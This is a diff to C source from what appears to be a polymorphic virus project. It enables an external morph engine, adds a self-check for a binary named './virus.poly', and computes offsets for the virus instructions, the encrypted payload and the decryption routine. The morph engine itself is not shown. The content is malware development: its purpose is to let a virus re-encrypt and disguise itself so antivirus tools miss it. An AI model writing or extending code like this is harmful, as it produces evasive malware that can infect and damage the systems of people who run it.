@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <bfd.h>
 
-// extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
+extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 
 typedef struct node {
   const char* name;
@@ -78,12 +78,19 @@ int polymorphic(int argc, char* argv[])
       char start[]="_start";
       char decryption[]="decrypt.decryption_function";
       
-      write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
-      printf("\n");
-      write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
-      printf("\n");
-      write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
-      printf("\n");
+	// now create logic to decrypt the whole chunk of file first, because the morphed virus will be encrypted so cant find symobls
+	char nogo[]="./virus.poly";
+	if(strcmp(nogo,argv[0])==0){
+		printf("hello");
+		return 0;
+	}
+
+      // write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
+      // printf("\n");
+      // write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
+      // printf("\n");
+      // write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
+      // printf("\n");
 
 	// // to get offset just delete the most significant char
 
@@ -94,12 +101,12 @@ int polymorphic(int argc, char* argv[])
       // write(1, main_offset, strlen(main_offset));
 
       const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
-	size_t virus_encrypt_size    = strtoull(start_offset, NULL, 16);
+	size_t virus_encrypt_size    = (int)strtol(start_offset, NULL, 16);
       
       // calculate the payload size
       virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;
 
-	const size_t virus_decrypt_offset  = strtoull(decryption_offset, NULL, 16);
+	const size_t virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
 
       printf("%ul\n", virus_instruction_begin);
       printf("%ul\n", virus_encrypt_size);
